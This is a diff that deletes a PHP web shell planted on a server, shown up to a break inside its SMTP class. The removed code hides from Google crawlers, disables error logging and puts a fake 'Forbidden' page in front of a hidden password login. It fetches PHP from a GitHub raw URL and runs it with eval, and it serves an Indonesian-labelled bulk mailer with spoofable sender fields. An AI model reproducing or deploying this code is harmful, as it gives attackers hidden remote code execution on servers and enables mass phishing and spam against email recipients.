@@ -1,5771 +1,2830 @@
-<?php
-$x0b = "27b92b681c4a1e255f66556a42ca6bef";
-$x0c = "#00FF66";
-$x0d = 'FilesMan';
-@define('SELF_PATH', __FILE__);
-if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
-    header('HTTP/1.0 404 Not Found');
-    exit;
-}
-@session_start();
-@error_reporting(0);
-@ini_set('error_log',NULL);
-@ini_set('log_errors',0);
-@ini_set('max_execution_time',0);
-@set_time_limit(0);
-@set_magic_quotes_runtime(0);
-@define('VERSION', '2.2');
-if( get_magic_quotes_gpc() ) {
-    function stripslashes_array($x0e) {
-        return is_array($x0e) ? array_map('stripslashes_array', $x0e) : stripslashes($x0e);
-    }
-    $_POST = stripslashes_array($_POST);
-}
-function printLogin() {
-    ?>
-<h1>Forbidden</h1>
-<p>You don't have permission to acces on this server.</p>
-<address>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</address>
-    <style>
-        input { margin:0;background-color:#fff;border:1px solid #fff; }
-    </style>
-    <div style='position: fixed; bottom: 0px; left: 0px; width: 0px;'>  
-    <form method=post>
-    <input type=password name=pass>
-    </form></div>
-    
-<?php
-    exit;
-}
-if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
-	if( empty( $x0b ) ||
-		( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $x0b) ) )
-		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-	else
-		printLogin();
-//Duwur Dewe //
-if ( isset($_GET['SloROkaN']) )
-{
-
-$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/34971q6eydrieuoisl0r0k4N.php";
-$x10 = file_get_contents($x0f);
-eval('?>'.$x10);
-
-
-}
-if ( isset($_GET['XdRpLs']) )
-{
-
-$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/873r872yieuhw987ipl00cup.php";
-$x10 = file_get_contents($x0f);
-eval('?>'.$x10);
-
-
-}
-if ( isset($_GET['M']) )
-	{
-	// HsH Mailer Extrime Card
-	error_reporting(0);
-	function query_str($x11){
-	$x12 = ''; 
-	foreach ($x11 as $x13 => $x14) {
-	$x12 .= (strlen($x12) < 1) ? '' : '&';
-	$x12 .= $x13 . '=' . rawurlencode($x14);
-	}
-	return ($x12);
-	}
-	function lrtrim($x15){
-	return stripslashes(ltrim(rtrim($x15)));
-	}
-	if(isset($_POST['action'] ) ){
-
-	$x16 = query_str($_POST);
-	parse_str($x16);  
-	$x17=lrtrim($x17);  
-	$x18=lrtrim($x18);
-	$x19=lrtrim($x19);
-	$x1a=lrtrim($x1a);
-	$x1b=lrtrim($x1b);
-	$x1c=lrtrim($x1c);
-	$x1d=lrtrim($x1d);
-	$x1e=lrtrim($x1e);
-	$x1f=lrtrim($x1f);
-	$x20=lrtrim($x20);
-	$x21=lrtrim($x21);
-	$x22=lrtrim($x22);
-	$x23=lrtrim($x24);
-	$x25=lrtrim($x26);
-	$x27=$x28['file']['name'];
-	$x29=$x28['file']['tmp_name'];
-	$x2a=lrtrim($x2a);
-	$x2b=lrtrim($x2b);
-	$x2c=$_POST['encode'];
-
-
-			$x19 = urlencode($x19);
-			$x19 = ereg_replace("%5C%22", "%22", $x19);
-			$x19 = urldecode($x19);
-			$x19 = stripslashes($x19);
-			$x24 = stripslashes($x24);
-			if ($x2c == "yes") {
-			$x24 = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $x24);
-			$x24 = str_replace(' ', '_', $x24);
-			$x24 = "=?UTF-8?Q?$x24?=";
-			$x26 = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $x26);
-			$x26 = str_replace(' ', '_', $x26);
-			$x26 = "=?UTF-8?Q?$x26?=";
-			}
-	}
-	?>
-
-	<html>
-
-	<head>
-	<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
-	<title> >-|I|-> Extrime |  Card <-|I|-< </title>
-
-	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
-
-	<script src='http://static.tumblr.com/qo0gonz/JsJn0gihy/jquery-1.6.2.js'></script>
-	 <style>
-	body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px }
-	A:link {text-decoration: none;color: aqua;}
-	A:active {text-decoration: none;color: aqua;}
-	A:visited {text-decoration: none;color: lime;}
-	A:hover {text-decoration: underline; color: Fuchsia;}
-	#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
-	input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
-	</style>
-	<style type="text/css">
-	<!--
-	.style1 {
-			font-family: Geneva, Arial, Helvetica, sans-serif;
-			font-size: 12px;
-	}
-	body{
-	margin:0px;
-	}
-	.bgup {
-	background: url(data:image/gif;base64,R0lGODlhMgAqALMLABcXFyYmJjAwMB0dHSAgIBoaGhkZGRQUFCQkJBwcHAAAAP///wAAAAAAAAAAAAAAACH+A0c0NAAh/wtORVRTQ0FQRTIuMAMBAAAAIfkEBQoACwAsAAAAADIAKgAABP9QyUmrvTjbk44sSCElycR5CoKY3Re6onJK6mQot0LoUynduZQNJ9nteEfgZDVS+FZMZ09Kmz6FQmbJhyXmjNMfsSr+8pDlJQsFiiUCAMksJRjIW4o27I5CCDSAgYKDhIWBNSNcc3oyeHMkE4yPXF1UXkVnSpdNmEljlpVcW1VaVKOcWU2iFFGWmmCbmpawslx+dk5wfHuNKI+6eS+9IwGGxsfIyRiTS1GQuylRc4vCc7WsFFyyUZqvmWOnoK2rtlaqpOeb4tlDQdxj3p45v3F0uG/1c7fQ1DEcygADCswgCc+zYDEKojg4DQ8jWp+4wIIYRBu8MbCgpLOkMZWUVemATnWkGAaNyWtpNsFSSKweI5a58jly2GqgzZvGGOJBNKwnT2bQeLr69C7HtnYlj5YM58wUR3OomLJL2aUbUaSolMYMWoffzq498XHFSbasoIMw9UVJu1ManlnfjF7tlFIrSo+npKL7uLEpyJMX3U0gqa5oS14N+4BlqxjXP7PHIgAAIfkEBQoACwAsAQABADAAKAAABP8wJUURUivrvdRJXChuikRNlHJRhmKErguXo3imajqBXEn3v1rGR6ykWq8ecsYTakoBgLN3mFqv2Kx2y918DpQCokD5VlYKMdmTALPdltSXtBQaYXVSjiV77mA7KReAQU97Pk0deSN3Sn16aEgJUWVtYWOVcAIDl2tmbxWbXaOkpVcqaHMhYllncpYlKJGPTwQYWIK3erI6hUODuI27RnxJJLatwoYTCJtlpiTNnG/Q1dbXCxMiJpknKGljrS03TLrLKbYErd/aQO3DRgjiveXlFOlZsJNTHtj+/wBXheuhxtsrNwXmGbNyoxgec4QS8Svyp8c7G4smfsuoCCIVWAU9oQDodIIStYAoU17BBCpWipAftLRUg8+dxxgLh/h4OC7dBXk2I9azSORnzWE8h9KhFeLTpJHgPEl00i1qBAAh+QQFCgALACwBAAEAMAAoAAAE/7Cgsqq9OOudEVIEqCgGOSqJko3fSnCa8n1oPaarrGI6zIchU+m2u7CKFpBvyWw6n9CodErFHBKHW2okKWhP16zMd1yVhrXcVnhCwMq81BrHs9XWbg7ceD7RjXZ9e08KVxtdNwEAI2EsVY+QkU2NhVgsNJUxiCh/ZIKCOiNnLiJEoiR6ckR4figrM62rep8mR6cGpEGBJAkBMZSUCAIDjAmSx8jJVV1LCcZSQrlmta7Qcq9jcXadS6WjP0o8oM/K5ebn6BdrhiuUmx5Ib3a7uOKodS1MpvvX2uRJPfTNW/ONzz1A+ZR5qSTmnYB0ECNWKCbGWbwFMjBRskgozLiLgx8m0tNnQBWRHAkBzqlmBNadjyhBjnRiCYUiFsPMhYkAACH5BAUKAAsALAEAAQAwACgAAAT/MCW1ql0F3c2XUlonftOnlAqRcorRsiAlbqR5mgjITgmcz7SbCaUisFwGH3DJbDqf0Kh02vwcEodPpvBB/JhYEmqrRXAV14OLWmm5a5/iscVj31CoXOhyX9uRQyZyNEhpZWcIAmwdW4uOj5CRCgVVXjJObzcsRYE+JoBdQDUsep1BOTV5opo0nKOnn5l6UFmTj4mRubq7OyhpUDpUr3wqTF2XlaZ8s6tfmCrDFinIIzG8T3vX2tsbYWjehiDZ0uHhllZYfH7N1B6goDEfSHwTxtY0PKk4gT3S6zPH5rhwMzAewUQD0NUq5w0XC4a1EFrhRrGixYsYM+5KQQaEootmAiIAADs=);
-	}
-
-
-	.uibutton { 
-		position: relative; 
-		z-index: 1;
-		overflow: visible; 
-		display: inline-block; 
-		padding: 0.3em 0.6em 0.375em; 
-		border: 1px solid Lime; 
-		border-bottom-color: Lime;
-		
-		margin: 0;
-		text-decoration: none; 
-		text-align: center;
-		font: bold 11px/normal 'lucida grande', tahoma, verdana, arial, sans-serif; 
-		white-space: nowrap; 
-		cursor: pointer; 
-		/* outline: none; */
-		color: #f9f9f9; 
-		background-color: #eee;
-		background-image: -webkit-gradient(linear, 0 0, 0 100%, from(Lime), to(Lime));
-		background-image: -moz-linear-gradient(Lime, Lime);
-		background-image: -o-linear-gradient(Lime, Lime);
-		background-image: linear-gradient(Lime, Lime);
-
-		/* IE hacks */
-
-		*display: inline; 
-
-	}
-
-	.uibutton:hover,
-	.uibutton:focus,
-	.uibutton:active {
-		border-color: Lime Lime Lime Lime;
-	}
-
-	.uibutton:active {
-		border-color: Lime;
-		background: Lime;
-		filter: none;
-		-webkit-box-shadow: none;
-		-moz-box-shadow: none;
-		box-shadow: none;
-	}
-
-	/* overrides extra padding on button elements in Firefox */
-	.uibutton::-moz-focus-inner {
-		padding: 0;
-		border: 0;
-	}
-
-
-
-	-->
-	</style>
-	<style type="text/css">
-	<!--
-	.style1 {
-			font-size: 10px;
-			font-family: Geneva, Arial, Helvetica, sans-serif;
-			body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px }
-	A:link {text-decoration: none;color: aqua;}
-	A:active {text-decoration: none;color: aqua;}
-	A:visited {text-decoration: none;color: lime;}
-	A:hover {text-decoration: underline; color: Fuchsia;}
-	#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
-	input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
-	}
-	-->
-	</style>
-	</head>
-	<body bgcolor="#f9f9f9" class="bgup">
-	<div class="cadre" style="height:10px;margin:0px auto;"></div>
-	<div style="width:80%;margin:0 auto;">
-	<p align="center"><font size="5" face="Bauhaus 93"> >-|I|-> Extrime |  Card <-|I|-< </font></p>
-	<form name="form1" method="post" action="" enctype="multipart/form-data">
-
-	  <br>
-	<center><table style="background:#" border="1"><tr>
-	<th style="background:blink;"> 
-	  <table width="100%" border="0" height="407" style="background:#fff" cellpadding="0" cellspacing="0">
-
-		<tr>
-
-		  <td width="100%" colspan="4"  style="color:#fff;background:Darkviolet" height="36">
-
-			<b>
-
-			<font face="Arial" size="2" >&nbsp;SMTP SETING</font></b></td>
-
-		  </tr>
-		<tr >
-
-		  <td width="10%" height="22" style="padding:10px;">
-	   
-			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">SMTP Login:</font></div>
-
-		  </td>
-
-		  <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			<input type="text" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="smtp_username" value="<?=$x20;?>" size="30">
-
-			</font></td>
-
-		  <td width="31%" height="22" style="padding:10px;">
-
-			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">SMTP Pass:</font></div>
-
-		  </td>
-
-		  <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			<input type="password" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="smtp_password" value="<?=$x21;?>" size="30">
-
-			</font></td>
-
-		</tr>
-		<tr>
-
-		  <td width="10%" height="22" style="padding:10px;">
-
-			<div align="right">
-			  <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Port :</font></div>
-
-		  </td>
-
-		  <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			<input type="text" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="ssl_port" value="<?=$x1f;?>" size="5"> 
-		  (optional)</font></td>
-
-		  <td width="31%" height="22" style="padding:10px;">
-
-			<div align="right">
-			  <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SMTP Server 
-			  Smtp:</font></div>
-
-		  </td>
-
-		  <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			<input type="text" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="my_smtp" value="<?=$x1e;?>" size="30">
-
-			</font></td>
-
-		</tr>
-		<tr>
-
-		  <td width="10%" height="22" style="padding:10px;">
-
-			<p align="right">
-			<font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SSL Server:</font></td>
-
-		  <td width="18%" height="22" style="padding:10px;">
-		  <input type="checkbox" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="sslclick" value="ON" <? if($x17){ print "checked"; } ?> ><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">(yes)</font></td>
-
-		  <td width="31%" height="22" style="padding:10px;">
-
-			<p align="right">
-			<font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Reconnect 
-			After:</font></td>
-
-		  <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			<input type="text" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="reconnect" value="<?=$x1c;?>" size="5"> 
-		  EMAILS</font></td>
-
-		</tr>
-		<tr>
-
-		  <td width="100%" height="39"  colspan="4" style="padding:10px;">
-
-			<p align="center">
-			<font face="Arial" style="font-size: 9pt" color="Darkviolet"><b> Jika Anda tidak memiliki SMTP login  Kosongkan pertanyaan di atas </b></font></td>
-
-		  </tr>
-
-		<tr>
-
-		  <td width="10%" height="19" style="padding:10px;">
-
-			&nbsp;</td>
-
-		  <td width="18%" height="19" style="padding:10px;">&nbsp;</td>
-
-		  <td width="31%" height="19" style="padding:10px;">
-
-			&nbsp;</td>
-
-		  <td width="41%" height="19" style="padding:10px;">&nbsp;</td>
-
-		</tr>
-
-		<tr>
-
-		  <td width="100%" colspan="4" style="color:#fff;background:Darkviolet" height="36">
-
-			<b>
-
-			<font face="Arial" size="2" color="#FFFFFF">&nbsp;MESSAGE SETING</font></b></td>
-
-		  </tr>
-			  <tr>
-
-		  <td width="10%" height="22" style="padding:10px;">
-			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Attach File :</font></div>
-		  </td>
-
-		  <td width="59%" height="22" style="padding:10px;"  colSpan="3">
-		  <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-	<input type="file" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="file" size="124">
-
-			</font></td>
-
-		</tr>
-		<tr>
-
-		  <td width="10%" height="22" style="padding:10px;">
-
-			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			  Email Anda:</font></div>
-
-		  </td>
-
-		  <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			<input type="text" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="from" value="<?=$x1b;?>" size="30">
-
-			</font></td>
-
-		  <td width="31%" height="22" style="padding:10px;">
-
-			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			  Nama Anda:</font></div>
-
-		  </td>
-
-		  <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			<input type="text" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="realname" value="<?=$x25;?>" size="30">
-
-			</font></td>
-
-		</tr>
-		<tr>
-
-		  <td width="10%" height="22" style="padding:10px;">
-
-			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Reply-To:</font></div>
-
-		  </td>
-
-		  <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			<input type="text" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="replyto" value="<?=$x22;?>" size="30">
-
-			</font></td>
-
-		  <td width="31%" height="22" style="padding:10px;">
-
-			<p align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-			Prioritas Email :</font></td>
-
-		  <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			&nbsp;</font><select style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="epriority" id="listMethod" onchange="showHideListConfig()">
-			<option value="" <? if(strlen($x1d)< 1){print "selected";} ?> >- Pilihan -</option>
-			<option value="1" <? if($x1d == "1"){print "selected";} ?> >Kenceng</option>
-			<option value="3" <? if($x1d == "3"){print "selected";} ?> >Normal</option>
-			<option value="5" <? if($x1d == "5"){print "selected";} ?> >Pelan</option>
-			</select></td>
-
-		</tr>
-
-		<tr>
-
-		  <td width="10%" height="22" style="padding:10px;">
-
-			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div>
-
-		  </td>
-
-		  <td colspan="3" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			<input type="text" name="subject" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" value="<?=$x23;?>" size="90">
-
-			</font></td>
-
-		</tr>
-
-		<tr>
-
-		  <td width="10%" height="22" style="padding:10px;">
-
-			&nbsp;</td>
-
-		  <td colspan="3" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			&nbsp; <font color="Darkviolet">Encode Informasi Pengiriman ?</font> <select style="background:#EFFBF8;;border: 1px solid Lime;color:#333" size="1" name="encode">
-			<option <? if($x2c == "yes"){print "selected";} ?>>ya</option>
-			<option <? if($x2c == "no"){print "selected";} ?>>Tidak</option>
-			</select></font></td>
-
-		</tr>
-
-		<tr valign="top">
-
-	<td colspan="3" height="190" style="padding:10px;"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
-
-			<textarea name="message" cols="60" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" rows="10"><?=$x19;?></textarea>
-
-			<br>
-
-			<input type="radio" name="contenttype" value="plain" >
-
-			Plain 
-
-			<input type="radio" name="contenttype" value="html" checked>
-
-			HTML 
-
-			<input type="hidden" name="action" value="send">
-			<input class="uibutton" type="submit" value="Send Message">
-
-			</font></td>
-
-		  <td width="41%" height="190" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
-
-			<textarea name="emaillist" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" cols="30" rows="10"><?=$x1a;?></textarea>
-
-			</font></td>
-
-		</tr>
-
-	  </table>
-
-	</form>
-	</center>
-
-
-	<?
-
-	if ($x18){
-			if (!$x1b && !$x24 && !$x19 && !$x1a){
-			print "<script>alert('Please complete all fields before sending your message.'); </script>";
-			die();	}
-
-	class SMTP
-	{
-	  /**
-	   *  SMTP server port
-	   *  @var int
-	   */
-	  var $x2d = 25;
-
-	  /**
-	   *  SMTP reply line ending
-	   *  @var string
-	   */
-	  var $x2e = "\r\n";
-
-	  /**
-	   *  Sets whether debugging is turned on
-	   *  @var bool
-	   */
-	  var $x2f;       # the level of debug to perform
-
-	  /**
-	   *  Sets VERP use on/off (default is off)
-	   *  @var bool
-	   */
-	  var $x30 = false;
-
-	  /**#@+
-	   * @access private
-	   */
-	  var $x31;      # the socket to the server
-	  var $x32;          # error if any on the last call
-	  var $x33;      # the reply the server sent to us for HELO
-	  /**#@-*/
-
-	  /**
-	   * Initialize the class so that the data is in a known state.
-	   * @access public
-	   * @return void
-	   */
-	  function SMTP() {
-		$this->smtp_conn = 0;
-		$this->error = null;
-		$this->helo_rply = null;
-
-		$this->do_debug = 0;
-	  }
-
-	  /*************************************************************
-	   *                    CONNECTION FUNCTIONS                  *
-	   ***********************************************************/
-
-	  /**
-	   * Connect to the server specified on the port specified.
-	   * If the port is not specified use the default SMTP_PORT.
-	   * If tval is specified then a connection will try and be
-	   * established with the server for that number of seconds.
-	   * If tval is not specified the default is 30 seconds to
-	   * try on the connection.
-	   *
-	   * SMTP CODE SUCCESS: 220
-	   * SMTP CODE FAILURE: 421
-	   * @access public
-	   * @return bool
-	   */
-	  function Connect($x34,$x35=0,$x36=30) {
-		# set the error val to null so there is no confusion
-		$this->error = null;
-
-		# make sure we are __not__ connected
-		if($this->connected()) {
-		  # ok we are connected! what should we do?
-		  # for now we will just give an error saying we
-		  # are already connected
-		  $this->error = array("error" => "Already connected to a server");
-		  return false;
-		}
-
-		if(empty($x35)) {
-		  $x35 = $this->SMTP_PORT;
-		}
-
-		#connect to the smtp server
-		$this->smtp_conn = fsockopen($x34,    # the host of the server
-									 $x35,    # the port to use
-									 $x37,   # error number if any
-									 $x38,  # error message if any
-									 $x36);   # give up after ? secs
-		# verify we connected properly
-		if(empty($this->smtp_conn)) {
-		  $this->error = array("error" => "Failed to connect to server",
-							   "errno" => $x37,
-							   "errstr" => $x38);
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": $x38 ($x37)" . $this->CRLF;
-		  }
-		  return false;
-		}
-
-		# sometimes the SMTP server takes a little longer to respond
-		# so we will give it a longer timeout for the first read
-		// Windows still does not have support for this timeout function
-		if(substr(PHP_OS, 0, 3) != "WIN")
-		 socket_set_timeout($this->smtp_conn, $x36, 0);
-
-		# get any announcement stuff
-		$x39 = $this->get_lines();
-
-		# set the timeout  of any socket functions at 1/10 of a second
-		//if(function_exists("socket_set_timeout"))
-		//   socket_set_timeout($this->smtp_conn, 0, 100000);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x39;
-		}
-
-		return true;
-	  }
-
-	  /**
-	   * Performs SMTP authentication.  Must be run after running the
-	   * Hello() method.  Returns true if successfully authenticated.
-	   * @access public
-	   * @return bool
-	   */
-	  function Authenticate($x3a, $x3b) {
-		// Start authentication
-		fputs($this->smtp_conn,"AUTH LOGIN" . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($x3d != 334) {
-		  $this->error =
-			array("error" => "AUTH not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-
-		// Send encoded username
-		fputs($this->smtp_conn, base64_encode($x3a) . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($x3d != 334) {
-		  $this->error =
-			array("error" => "Username not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-
-		// Send encoded password
-		fputs($this->smtp_conn, base64_encode($x3b) . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($x3d != 235) {
-		  $this->error =
-			array("error" => "Password not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-
-		return true;
-	  }
-
-	  /**
-	   * Returns true if connected to a server otherwise false
-	   * @access private
-	   * @return bool
-	   */
-	  function Connected() {
-		if(!empty($this->smtp_conn)) {
-		  $x3e = socket_get_status($this->smtp_conn);
-		  if($x3e["eof"]) {
-			# hmm this is an odd situation... the socket is
-			# valid but we are not connected anymore
-			if($this->do_debug >= 1) {
-				echo "SMTP -> NOTICE:" . $this->CRLF .
-					 "EOF caught while checking if connected";
-			}
-			$this->Close();
-			return false;
-		  }
-		  return true; # everything looks good
-		}
-		return false;
-	  }
-
-	  /**
-	   * Closes the socket and cleans up the state of the class.
-	   * It is not considered good to use this function without
-	   * first trying to use QUIT.
-	   * @access public
-	   * @return void
-	   */
-	  function Close() {
-		$this->error = null; # so there is no confusion
-		$this->helo_rply = null;
-		if(!empty($this->smtp_conn)) {
-		  # close the connection and cleanup
-		  fclose($this->smtp_conn);
-		  $this->smtp_conn = 0;
-		}
-	  }
-
-	  /***************************************************************
-	   *                        SMTP COMMANDS                       *
-	   *************************************************************/
-
-	  /**
-	   * Issues a data command and sends the msg_data to the server
-	   * finializing the mail transaction. $x3f is the message
-	   * that is to be send with the headers. Each header needs to be
-	   * on a single line followed by a <CRLF> with the message headers
-	   * and the message body being seperated by and additional <CRLF>.
-	   *
-	   * Implements rfc 821: DATA <CRLF>
-	   *
-	   * SMTP CODE INTERMEDIATE: 354
-	   *     [data]
-	   *     <CRLF>.<CRLF>
-	   *     SMTP CODE SUCCESS: 250
-	   *     SMTP CODE FAILURE: 552,554,451,452
-	   * SMTP CODE FAILURE: 451,554
-	   * SMTP CODE ERROR  : 500,501,503,421
-	   * @access public
-	   * @return bool
-	   */
-	  function Data($x3f) {
-		$this->error = null; # so no confusion is caused
-
-		if(!$this->connected()) {
-		  $this->error = array(
-				  "error" => "Called Data() without being connected");
-		  return false;
-		}
-
-		fputs($this->smtp_conn,"DATA" . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 354) {
-		  $this->error =
-			array("error" => "DATA command not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-
-		# the server is ready to accept data!
-		# according to rfc 821 we should not send more than 1000
-		# including the CRLF
-		# characters on a single line so we will break the data up
-		# into lines by \r and/or \n then if needed we will break
-		# each of those into smaller lines to fit within the limit.
-		# in addition we will be looking for lines that start with
-		# a period '.' and append and additional period '.' to that
-		# line. NOTE: this does not count towards are limit.
-
-		# normalize the line breaks so we know the explode works
-		$x3f = str_replace("\r\n","\n",$x3f);
-		$x3f = str_replace("\r","\n",$x3f);
-		$x40 = explode("\n",$x3f);
-
-		# we need to find a good way to determine is headers are
-		# in the msg_data or if it is a straight msg body
-		# currently I am assuming rfc 822 definitions of msg headers
-		# and if the first field of the first line (':' sperated)
-		# does not contain a space then it _should_ be a header
-		# and we can process all lines before a blank "" line as
-		# headers.
-		$x41 = substr($x40[0],0,strpos($x40[0],":"));
-		$x42 = false;
-		if(!empty($x41) && !strstr($x41," ")) {
-		  $x42 = true;
-		}
-
-		$x43 = 998; # used below; set here for ease in change
-
-		while(list(,$x44) = @each($x40)) {
-		  $x45 = null;
-		  if($x44 == "" && $x42) {
-			$x42 = false;
-		  }
-		  # ok we need to break this line up into several
-		  # smaller lines
-		  while(strlen($x44) > $x43) {
-			$x46 = strrpos(substr($x44,0,$x43)," ");
-
-			# Patch to fix DOS attack
-			if(!$x46) {
-			  $x46 = $x43 - 1;
-			}
-
-			$x45[] = substr($x44,0,$x46);
-			$x44 = substr($x44,$x46 + 1);
-			# if we are processing headers we need to
-			# add a LWSP-char to the front of the new line
-			# rfc 822 on long msg headers
-			if($x42) {
-			  $x44 = "\t" . $x44;
-			}
-		  }
-		  $x45[] = $x44;
-
-		  # now send the lines to the server
-		  while(list(,$x47) = @each($x45)) {
-			if(strlen($x47) > 0)
-			{
-			  if(substr($x47, 0, 1) == ".") {
-				$x47 = "." . $x47;
-			  }
-			}
-			fputs($this->smtp_conn,$x47 . $this->CRLF);
-		  }
-		}
-
-		# ok all the message data has been sent so lets get this
-		# over with aleady
-		fputs($this->smtp_conn, $this->CRLF . "." . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 250) {
-		  $this->error =
-			array("error" => "DATA not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
-			echo "SMTP -> ERROR: " . $this->error["error"] .
-					 ": " . $x3c . $this->CRLF;
-		  }
-		  return false;
-		}
-		return true;
-	  }
-
-	  /**
-	   * Expand takes the name and asks the server to list all the
-	   * people who are members of the _list_. Expand will return
-	   * back and array of the result or false if an error occurs.
-	   * Each value in the array returned has the format of:
-	   *     [ <full-name> <sp> ] <path>
-	   * The definition of <path> is defined in rfc 821
-	   *
-	   * Implements rfc 821: EXPN <SP> <string> <CRLF>
-	   *
-	   * SMTP CODE SUCCESS: 250
-	   * SMTP CODE FAILURE: 550
-	   * SMTP CODE ERROR  : 500,501,502,504,421
-	   * @access public
-	   * @return string array
-	   */
-	  function Expand($x48) {
-		$this->error = null; # so no confusion is caused
-
-		if(!$this->connected()) {
-		  $this->error = array(
-				"error" => "Called Expand() without being connected");
-		  return false;
-		}
-
-		fputs($this->smtp_conn,"EXPN " . $x48 . $this->CRLF);
-
-		$x3c = $this->get_lines();
-		$x3d = substr($x3c,0,3);
-
-		if($this->do_debug >= 2) {
-		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
-		}
-
-		if($x3d != 250) {
-		  $this->error =
-			array("error" => "EXPN not accepted from server",
-				  "smtp_code" => $x3d,
-				  "smtp_msg" => substr($x3c,4));
-		  if($this->do_debug >= 1) {
